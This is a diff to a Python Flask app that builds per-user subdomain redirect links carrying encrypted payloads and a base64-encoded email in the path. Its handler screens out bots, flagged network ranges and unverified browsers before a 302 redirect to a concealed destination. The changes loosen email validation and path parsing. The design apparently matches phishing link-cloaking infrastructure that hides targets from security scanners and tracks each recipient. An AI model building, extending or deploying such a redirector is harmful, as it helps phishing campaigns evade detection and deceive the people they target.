@@ -367,7 +367,7 @@ def index():
                         </div>
                         <div>
                             <label class="block text-sm font-medium text-gray-700">Base64emailInput</label>
-                            <input type="email" name="base64email" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            <input type="text" name="base64email" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                         </div>
                         <div>
                             <label class="block text-sm font-medium text-gray-700">Destination Link</label>
@@ -427,7 +427,7 @@ def generate():
             abort(403, "Access denied")
 
         randomstring1 = request.form.get("randomstring1", "default")
-        base64email = request.form.get("base64email", "user@example.com")
+        base64email = request.form.get("base64email", "default")
         destination_link = request.form.get("destination_link", "https://example.com")
         randomstring2 = request.form.get("randomstring2", generate_random_string(8))
 
@@ -435,9 +435,6 @@ def generate():
         if not re.match(r"^https?://", destination_link):
             logger.error(f"Invalid URL: {destination_link}")
             abort(400, "Invalid URL")
-        if not re.match(r"[^@]+@[^@]+\.[^@]+", base64email):
-            logger.error(f"Invalid email: {base64email}")
-            abort(400, "Invalid email")
         if len(randomstring1) > 20:
             randomstring1 = randomstring1[:20]
             logger.debug(f"Truncated Randomstring1 to 20 chars: {randomstring1}")
@@ -462,15 +459,19 @@ def generate():
         })
 
         logger.debug(f"Selected encryption method: {method}")
-        if method == 'heap_x3':
-            encrypted_payload = encrypt_heap_x3(payload, fingerprint)
-        elif method == 'slugstorm':
-            encrypted_payload = encrypt_slugstorm(payload)
-        elif method == 'pow':
-            encrypted_payload = encrypt_pow(payload)
-        else:
-            encrypted_payload = encrypt_signed_token(payload)
-        generated_url = f"https://{sanitized_name}.{BASE_DOMAIN}/{endpoint}/{urllib.parse.quote(encrypted_payload)}/{path_segment}"
+        try:
+            if method == 'heap_x3':
+                encrypted_payload = encrypt_heap_x3(payload, fingerprint)
+            elif method == 'slugstorm':
+                encrypted_payload = encrypt_slugstorm(payload)
+            elif method == 'pow':
+                encrypted_payload = encrypt_pow(payload)
+            else:
+                encrypted_payload = encrypt_signed_token(payload)
+        except Exception as e:
+            logger.error(f"Encryption failed with {method}: {str(e)}", exc_info=True)
+            abort(500, "Failed to encrypt payload")
+        generated_url = f"https://{sanitized_name}.{BASE_DOMAIN}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
         logger.info(f"Generated URL with {method}: {generated_url}")
 
         theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
@@ -506,13 +507,13 @@ def generate():
         logger.error(f"Internal Server Error in generate: {str(e)}", exc_info=True)
         raise
 
-@app.route("/<endpoint>/<path:encrypted_payload>/<path_segment>", methods=["GET"], subdomain="<username>")
+@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
 @rate_limit(limit=5, per=60)
 def redirect_handler(username, endpoint, encrypted_payload, path_segment):
     try:
         user_agent = request.headers.get("User-Agent", "")
         ip = request.remote_addr
-        logger.debug(f"Redirect handler for {username}.{BASE_DOMAIN}/{endpoint}, IP: {ip}, User-Agent: {user_agent}")
+        logger.debug(f"Redirect handler for {username}.{BASE_DOMAIN}/{endpoint}, IP: {ip}, User-Agent: {user_agent}, Path Segment: {path_segment}")
 
         if is_bot(user_agent) or check_asn(ip) or not verify_browser():
             logger.warning("Bot or unverified browser detected")
@@ -563,17 +564,21 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 </html>
             """, challenge=challenge)
 
+        # Flexible path_segment parsing (no strict email validation)
         randomstring1_short = path_segment[:6] if len(path_segment) >= 6 else "xxxxxx"
         randomstring2_short = path_segment[-8:] if len(path_segment) >= 8 else "xxxxxxxx"
-        base64_email = path_segment[6:-8] if len(path_segment) > 14 else ""
-        try:
-            email = base64.urlsafe_b64decode(base64_email + "==").decode()
-            if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
-                email = "modified@example.com"
-        except:
-            email = "modified@example.com"
-        logger.debug(f"Parsed path_segment: randomstring1={randomstring1_short}, email={email}, randomstring2={randomstring2_short}")
+        base64_email = path_segment[6:-8] if len(path_segment) > 14 else "default"
+        logger.debug(f"Parsed path_segment: randomstring1={randomstring1_short}, base64email={base64_email}, randomstring2={randomstring2_short}")
 
+        # Decode encrypted_payload
+        try:
+            encrypted_payload = urllib.parse.unquote(encrypted_payload)
+            logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}...")
+        except Exception as e:
+            logger.error(f"Error decoding encrypted_payload: {str(e)}", exc_info=True)
+            abort(400, "Invalid payload format")
+
+        # Try decryption methods
         payload = None
         for method in ['heap_x3', 'slugstorm', 'pow', 'signed_token']:
             try:
@@ -612,6 +617,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
             logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
             abort(400, "Invalid payload")
 
+        # Pass path_segment as-is, including slashes
         final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
         logger.info(f"Redirecting to {final_url}")
         return redirect(final_url, code=302)
